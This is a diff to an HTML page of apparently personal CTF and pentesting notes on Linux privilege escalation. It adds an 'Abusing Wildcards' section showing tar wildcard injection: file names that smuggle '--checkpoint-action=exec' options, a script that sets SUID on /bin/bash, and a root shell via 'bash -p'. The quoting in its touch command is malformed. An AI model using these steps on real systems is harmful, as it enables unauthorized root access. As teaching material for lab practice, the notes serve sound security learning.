@@ -207,7 +207,7 @@ User daniel.carter may run the following commands on NIX02:
 
                     <h2 id="Path Hijacking">Path Hijacking</h2>
                     <ul>
-                        <p> ⚠️WARNING!! This process may vary depending of the CTF</p>
+                        <p> ⚠️WARNING!! This only works if you have privileges to run the binary. In case the binary is being run by another user it will not work due the PATH environment variable</p>
                         <h3> Steps </h3>
                         <p>First you need to find a binary which uses relative paths for example</p>
                         <pre><code class="language-bash">cp file1 file2
@@ -238,6 +238,21 @@ void main(){
                         <a class="cherry-banner" href="/H4ckV4ult/pages/protocols/python.html">
                             <h2>Check for more information ↗️</h2>
                         </a>
+                    </ul> 
+
+                    <h2 id="Abusing Wildcards">Abusing Wildcards</h2>
+                    <ul>
+                        <p>In case you found an script that uses wildcards ( * ). For example:</p>
+                        <pre><code class="language-bash">tar -cf /opt/backups/website.tar *</code></pre>
+                        <p>Suspect that you may be able to exploit it. <b>But remember it will all depends on the executable which is being used, in this case tar</b></p>
+                        <p>The key here is that you would create a file with a name <b>--function</b> which when tar process it will be interpreted as a command-line option.</p>
+                        <pre><code class="language-bash">tar -cf /opt/backups/website.tar --function</code></pre>
+                        <p>This can be abused by creating the following files</p>
+                        <pre><code class="language-bash">touch ./"--checkpoint=1
+./"--checkpoint-action=exec=bash exploit.sh"</code></pre>
+                        <pre><code class="language-bash">echo "chmod +s /bin/bash" > exploit.sh</code></pre>
+                        <p>Then wait for the execution of the exploit and finally</p>
+                        <pre><code class="language-bash">/bin/bash -p</code></pre>
                     </ul> 
 
                     <h2 id="Escaping restricted shells">Escaping restricted shells</h2>
